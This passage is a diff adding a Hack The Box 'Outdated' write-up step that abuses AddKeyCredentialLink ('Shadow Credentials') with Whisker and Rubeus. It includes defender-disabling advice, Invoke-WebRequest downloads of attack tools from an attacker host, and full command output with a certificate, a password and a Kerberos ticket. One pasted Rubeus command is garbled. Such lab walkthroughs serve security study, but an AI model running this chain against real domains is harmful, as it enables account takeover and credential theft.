@@ -692,36 +692,276 @@ $ sudo neo4j start
 $ bloodhound &
 ```
 
+## AddKeyCredentialLink
+
 The members of the group `ITSTAFF@OUTDATED.HTB` have the ability to write to the "`msds-KeyCredentialLink`" property on `SFLOWERS@OUTDATED.HTB`. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT.
 
 ![AddKeyCredentialLink](images/bh_AddKeyCredentialLink.png)
 
+![AddKeyCredentialLink details](images/bh_AddKeyCredentialLink_details.png)
+
+![AddKeyCredentialLink abuse Windows](images/bh_AddKeyCredentialLink_abuse_windows.png)
+
+- [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+- [Whisker - GitHub](https://github.com/eladshamir/Whisker)
+
+On a Windows machine with Visual Studio installed, close the repo and build the solution. Remember to disable Windows Defender (antivirus) or set the exclusion to don't scan the folder where the solution is getting built.
+
+![Win_VS_Whisker](images/Win_VS_Whisker_release.png)
+![Win_VS_Whisker](images/Win_VS_Whisker_build.png)
+
 ```bash
+Build started at 8:32 PM...
+1>------ Build started: Project: Whisker, Configuration: Release Any CPU ------
+1>  Whisker -> C:\Users\Kali\Projects\Whisker\Whisker\bin\Release\Whisker.exe
+========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
+========== Build completed at 8:32 PM and took 03.951 seconds ==========
+
+```
+
+Transfer `Whisker.exe` from Windows to Kali and then transfer to the target we have a shell.
+
+Open a smb share on kali to get the file and transfer it.
+
+```bash
+impacket-smbserver share $(pwd) -smb2support -user kali -pass kali
+```
+
+Copy `Whisker.exe` and `Rubeus.exe` to the web folder on the `follina.py` script that is already serving as a webserver.
+
+```bash
+cp Whisker/Whisker/bin/Release/Whisker.exe follina.py/www/
+cp /home/kali/Desktop/HTB/Academy/AD/Tools/Rubeus.exe follina.py/www/
+```
+
+On the target download the files.
+
+```bash
+Invoke-WebRequest -Uri 'http://10.10.14.2/Whisker.exe' -OutFile 'C:\Temp\Whisker.exe'
+Invoke-WebRequest -Uri 'http://10.10.14.2/Rubeus.exe' -OutFile 'C:\Temp\Rubeus.exe' 
+```
+
+Now lets list the entries for `sflowers`.
+
+```bash
+PS C:\Temp> C:\Temp\Whisker.exe list /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb
+[*] Searching for the target account
+[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Listing deviced for sflowers:
+[*] No entries!
+```
+
+There are no entries. Let's add one.
+
+```bash
+PS C:\Temp> C:\Temp\Whisker.exe add /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb /password:u5nDYAm5BqtYpG5v
+[*] No path was provided. The certificate will be printed as a Base64 blob
+[*] Searching for the target account
+[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID 7292f58d-6063-4bbd-be28-edda8a661f71
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object 
+[*] You can now run Rubeus with the following syntax:
+Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhYGCSqGSIb3DQEHAaC
+CBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAgScnk2aEVGZwICB9AEggTYv8eGZs6wErdst5+6Eb/K
+zyY2/XoF3UnyQr8DzPxCGluW8RyQx9ReLOg2PI+9Iaf4qqcp8k+jBohtbP/FaL2CGk/Raxj9TpGS5VwWI2e6kw8+W3IhV83XKu6w/4t5g83gBylV+
+tNGF2SBbAdoY0S2/h9YpkubNS82ordzipgcmQ7NKQ8oeHbrD+yxDkKqTO9L5Z2fpCEh6R1KFPkgl05tuu8VMRC4VDqTUoTDgEkodSCsY8TrxH65+W
+KxQGnd9wWkfIE7c80GAKGHsrVrRNHn4+7LdIfMtah3FkksdcU5dPSv+2IUoaMEb66rkI38XqcXBeB/irp1NSCNZKN75ujRatN2h5B2+6zyLkkv9b9
+/YEZB6ICKgbZMqbpECJxPfTQnh1t5kK6ahHCX6CLxxwTgZPGs3AONK9Npb7SHkip/eZ1fm6+CUhMzhxP7hhnD48zL3gLcsyKCrP25ruFH2fF/L6Iv
+CxI6Nqjb1Hwk5GvSLS/VK6X0yJlQj2eVfNC5YrnFdkeelicF0lLCtlVaPppZvNv/91aFyzH0dvmrayTZq1hc4MQC/AZUhvqi7Rnm2QVOATCNZVRpr
+7PFyWYHcfrRy4BXqb6oESt+Kb8MBZ/FDXu3BG1wH2Xgr20qHen5s37gf9qxFe6ZNoT54MNXr8lY+47ur2t1/4m8NRiH65l27XE6yqgF0bT85K8DKz
+3dY0ez4vuF98CrsfBlFZUTY+GOdLjYgbxEnt9s5TSWeuh/dJ8/2+zAOldDfataFGpZ4zi2J+HymPT1vKBQz2LqY8YahA1eURBgNUbfYXsSoVJw1To
+Pr7ITXso8Iep1VCSd2mD+9COEn2STUqhFGlmCMSfwFemf6DHkCJnNOP3SjP7U3+bdpyqnf3Kw6Uys7c6oY19GhgJyeZVcEUi3iJ91ZJLceI6Kzbvx
+Tv92Djs8ni+V4aer/BsB1EMY9r9KPW2J5o8C7iZymDRP0t3Up6KRuZrplL30TSSt6987U74c9b7itJL+Oo1y5wZOpm/IwwpXB3XLxEjoakDTNM4O2
++QPy7JK5kmTl2a0rxghDGPK3VAPgnzMDZeSUzUM4R6y8JsrdBNjcy1mn3A6/ZucMsFO0Zs2+RUPUwYIUU0rUgBefwy4efdJXW/N+eRRObMNMPX0DV
+QO3oIN1i9S1k8nl4OxzvN/EpqsbZW3LDtprPdKG8sD4tg8IzpU3DaRKdPnYxGFhy0YXFyC5SiA/SSwK7GQu4tQhrZ8S6qDLNS7kdQ7QVqhUFwQALo
+aUg3qywrJ4/4gtR3RoLPRWZVlPA4C408hyMLWVfx2axarDfIb43Ivsz7JandaKlw8I21UtP8Rjjr+w1kPh0rXZlmywZpSq2fS/nAC4SVHZGXImhvV
+S/Au0JXW0trhs9lAQL1oDJsAQE6ildFQxkZ+u5OV0pngAoWFQfs3ea2b10sMY8gH5cCdqZrjKA5hbtY8D2SK0UIH5/mcmtwZB2bWNnExuPS0tXV4+
+M7rkXwxMTCNdYa763u4A7PIkDX4nJHPQipnDrTqdTPO5uqhQgtVOIRs07f2Z6a+PUD+3sF1xdfgukfCu7jXwAKpiqnKoYDVfTy9LVTcvRCz4acKy7
+TzI+2gykKtlKN/WxWNz8tcqbFIr246WaSMWM/v+hdDgOU36z93xjGB6TATBgkqhkiG9w0BCRUxBgQEAQAAADBXBgkqhkiG9w0BCRQxSh5IADcANwA
+xADcAZgAwAGIAYwAtADQAZABlADEALQA0AGEAMQAxAC0AYgBkADIANQAtAGEAMgA0ADMAOQBjADIAYwA5ADcAOAAwMHkGCSsGAQQBgjcRATFsHmoA
+TQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAa
+QBjACAAUAByAG8AdgBpAGQAZQByMIIDPwYJKoZIhvcNAQcGoIIDMDCCAywCAQAwggMlBgkqhkiG9w0BBwEwHAYKKoZIhvcNAQwBAzAOBAi//G7T+U
+xvUwICB9CAggL4PghaVXJmpLdtV2VJOGvtrSbezALzTLeq1KmacTGetRquwP9rhK+z4Q6ywijLfx7cANtkxRJ0tTzC2zstZXFfAj8oW/oS2tejZwP
+b8FfqzVwvdwNAZFjhjNKyNuukxLpCyaYe1cNS/LTLUL0sz7bD0KBCI8yGpv8AHXG7ikHUbGzOuYHxCdY4ThJoAqNqxmUfg9KFVh4Mnmem7W+QyhkR
+zuTQIVcYrEyEzYxJ5ElZh0NI/zQ1MXY/0Fp4sZQdIyDlf36FTJC7QAQpDYBJNGGEAM4Vrry9qi6BLNyB+iE/NSUtS+feKsEiLT4/J69KpqBW7EHHD
+Fg6gazKBhuPAmVLycV5NYy6DQsbhZOItuORTCyeHGyzAW1x8Bg+UL8KHUMugKy1toITylc/+Rlogh5baVD/lOzL4vmFSO57UPf/h/v3kcaMxhrDeV
+WyuRy12+XxjDM58w3vlXl9fcPwz8kdW6C4RbVYIEZ1787GPAi1kz6m/G9ueh1UEVTtT5phmLRmyMhVyYrjMYxbfV5uwAQjG9B5UGmn2F/seq826O6
+kyitLZ/vVriNUJY/9QHubiZ7N9iVwHsRJf0YnhkUtrHjfp1y1vzjEoN3KnLSWxKb8cOt/bOdjmD0paL5rDPvRYUmiNuz/38NqSDmWWBkHLNRPggzW
+CAo3acPBBzAuIw+r96Np5ssWL9MwkZGaqOlLTXasQPmbZ1LaZRN67O36s/8BfySB2vI4/W2Ubrajru65A3h+CEloCUHd6KLPr+/mrDwcu1YuA3Niv
++7e+Y9sG1CQeHYoKORgf2jBGO7/PJmruoRGCmxQuyMXq/AZHxCDRbWt8XwIe6Hq3zKZ6DMoB+z8NvloL6Sxow9MG0fK+hWY4uSo5qiyPr48rf9lSH
+Hxs8AiBH1RUyzOwEOov4g0bT99uvidUFKrEEv8HsaLUgHNeY0hpGVqppI2Zn70nkiV0/jTpm/TCE7k0pax0luShUNRvrlMqr0DHQqdRUHuP6ZhgPV
+au3nuG7kePDA7MB8wBwYFKw4DAhoEFCiz8S5ML9QDN8mBwqM5FeyUaGfhBBTPCaRX2DxI0q06oYagfxLniD6wxAICB9A= /password:"u5nDYAm5
+BqtYpG5v" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+```
+
+The command outputs the `Rubeus` command that we need to execute.
+
+```bash
+C:\Temp\Rubeus.exe asktgt /user:sflowers /certificate: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 /password:"u5nDYAm5BqtYpG5v" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
 ```
 
 ```bash
+PS C:\Temp> C:\Temp\Rubeus.exe asktgt /user:sflowers /certificate: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:"u5nDYAm5BqtYpG5v" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+DVfTy9LVTcvRCz4acKy7TzI+2gykKtlKN/WxWNz8tcqbFIr246WaSMWM/v+hdDgOU36z93xjGB6TATBgkqhkiG9w0BCRUxBgQEAQAAADBXBgkqhki
+G9w0BCRQxSh5IADcANwAxADcAZgAwAGIAYwAtADQAZABlADEALQA0AGEAMQAxAC0AYgBkADIANQAtAGEAMgA0ADMAOQBjADIAYwA5ADcAOAAwMHkG
+CSsGAQQBgjcRATFsHmoATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwA
+HQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByMIIDPwYJKoZIhvcNAQcGoIIDMDCCAywCAQAwggMlBgkqhkiG9w0BBwEwHAYKKoZIhv
+cNAQwBAzAOBAi//G7T+UxvUwICB9CAggL4PghaVXJmpLdtV2VJOGvtrSbezALzTLeq1KmacTGetRquwP9rhK+z4Q6ywijLfx7cANtkxRJ0tTzC2zs
+tZXFfAj8oW/oS2tejZwPb8FfqzVwvdwNAZFjhjNKyNuukxLpCyaYe1cNS/LTLUL0sz7bD0KBCI8yGpv8AHXG7ikHUbGzOuYHxCdY4ThJoAqNqxmUf
+g9KFVh4Mnmem7W+QyhkRzuTQIVcYrEyEzYxJ5ElZh0NI/zQ1MXY/0Fp4sZQdIyDlf36FTJC7QAQpDYBJNGGEAM4Vrry9qi6BLNyB+iE/NSUtS+feK
+sEiLT4/J69KpqBW7EHHDFg6gazKBhuPAmVLycV5NYy6DQsbhZOItuORTCyeHGyzAW1x8Bg+UL8KHUMugKy1toITylc/+Rlogh5baVD/lOzL4vmFSO
+57UPf/h/v3kcaMxhrDeVWyuRy12+XxjDM58w3vlXl9fcPwz8kdW6C4RbVYIEZ1787GPAi1kz6m/G9ueh1UEVTtT5phmLRmyMhVyYrjMYxbfV5uwAQ
+jG9B5UGmn2F/seq826O6kyitLZ/vVriNUJY/9QHubiZ7N9iVwHsRJf0YnhkUtrHjfp1y1vzjEoN3KnLSWxKb8cOt/bOdjmD0paL5rDPvRYUmiNuz/
+38NqSDmWWBkHLNRPggzWCAo3acPBBzAuIw+r96Np5ssWL9MwkZGaqOlLTXasQPmbZ1LaZRN67O36s/8BfySB2vI4/W2Ubrajru65A3h+CEloCUHd6
+KLPr+/mrDwcu1YuA3Niv+7e+Y9sG1CQeHYoKORgf2jBGO7/PJmruoRGCmxQuyMXq/AZHxCDRbWt8XwIe6Hq3zKZ6DMoB+z8NvloL6Sxow9MG0fK+h
+WY4uSo5qiyPr48rf9lSHHxs8AiBH1RUyzOwEOov4g0bT99uvidUFKrEEv8HsaLUgHNeY0hpGVqppI2Zn70nkiV0/jTpm/TCE7k0pax0luShUNRvrl
+Mqr0DHQqdRUHuP6ZhgPVau3nuG7kePDA7MB8wBwYFKw4DAhoEFCiz8S5ML9QDN8mBwqM5FeyUaGfhBBTPCaRX2DxI0q06oYagfxLniD6wxAICB9A=
+ /password:"u5nDYAm5BqtYpG5v" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.2
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
+[*] Using domain controller: 172.16.20.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g
+      AwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRio4IEnzCCBJugAwIBEqEDAgECooIEjQSCBImOAaO+
+      lknutSI/plaNfxLYPgs3i/2R+5WEmzRjCNHH3et8bnnNXhsPcSZ7dwnt6apcLyg2H2WR/Xg/Iepel95M
+      FmzFFD4S5O/O/e7U6z+W1La8Ex05wV00B8iulFEbDv+KnZEWOjb9ATQIw4ZIqNclz7C5j5O9rDMNAgVC
+      JhU60ltqOA8fzHNxryeIid+oEew4YSfB3GsN9hUFVchfeFCoHb+rlcKkZZY2YolF950oN5R50TqFpErl
+      xpuApVZjqqxmt7yO1eumUWjBrOleIj9wi1muxfrhAck2OqA07+dwBzMJrNN2jOHbZxQhojsLTGVylsfo
+      RdW/EJuOA6xwmdaWZfDVN7jsoUfKympg7UFRA4kp64L5vGXiZ77RMoAs90BKHV82MBfFZc16klchm4Gx
+      lhzRR4vVm6fnvzgztFshEx5nGCq9OIdIzVDc4dcEMDtdQYw0iHSYnywGuN89Da9myeXa1fBKksq8trrm
+      pDbJVVIOo08u3HnsfdErcaM4APKs6VionCEQc2FoQ+dIFmuYo8boVPVMHITHeaQkDCi1SYF2L+IM9V7l
+      hiAJkA63leHJnIzbCPsQIPOZhuy1GLJ+aONfLJvi7gbeaZz1DcPd/tTBEdIlp5fgCW4A+XqIlD56YMkK
+      wq5q6fRqUJxzWx4IHoToBIIPezKxmFZ8bFcf3cDhIPLJoX2whYOxnKgjMVgNigiZjOP4q4UScoXweCIn
+      jkQMqAeoC7IK6fqNbZiVfnpV8NVY8DxWC+78mWKaSrqlZ1Gju7pIFMhucRL7DeGbRry2Y2S1kNhLcVeU
+      vZULZo6tMbb/qoovaS2FUub7CTX5ZIPNLg0RRum5bf7oIHIfwarGPIhnzp7rl+yiJK+OWNQli2UAzxe2
+      I8ZOf7gwx9MCq8SjUyg2Q3p7bAmFKVnB2Y/qlwFj0qBy6/hgY3bujW9DD00tw6o0ha9I2rY1uchIpYVF
+      AtH3JJlFMNVIPAl46SILk1kleIWduntGzCKytFjaimfeyqLrbr8HGY1f7cc3Wvdz3zwnLoQiKTv3PACZ
+      ZWWIb+OVtQSPi74S0tG1moUS04C1EFYEGpD4WTCzSxcSRWLvad/p/Uadf9CK8Kl/WP+EE/kP/BvC09Tf
+      sxlFBdVYgxpaztmIbIX16hH2JsKSdhaMQTqimlER3kT6l9k5TODEb61cr3MR5lTOeajv7Xxhe9ip8r1K
+      LeUzOT9D/vBc0eZ39NCFKbvLfnwVywp97sQbAh5OYohT8wcEo75aPN9worJuu8R2rhmyd117/HSn+Aid
+      SpdtmFOX5clgYhcG4xW0roYG4kfP1uELN62qfI5JtixI9BgW/rXkej+JQy4H7l7JmKtrCpI0Bqf30Rlq
+      Bc1uPPsHGj45r2jEM3CI4+TvBcac+4JQm0+A3rjvc5F88lN3y0/uxeqfY/Eta9c5FjUm6SA5c8oOD+29
+      y8Q0goi75cuiPwGu7F6uRrWg+ZVhnKuhh6FLTRjj5vFrwQ7YEo7QSrB5JV1eAnaxy2Od8J9FRdQehrVy
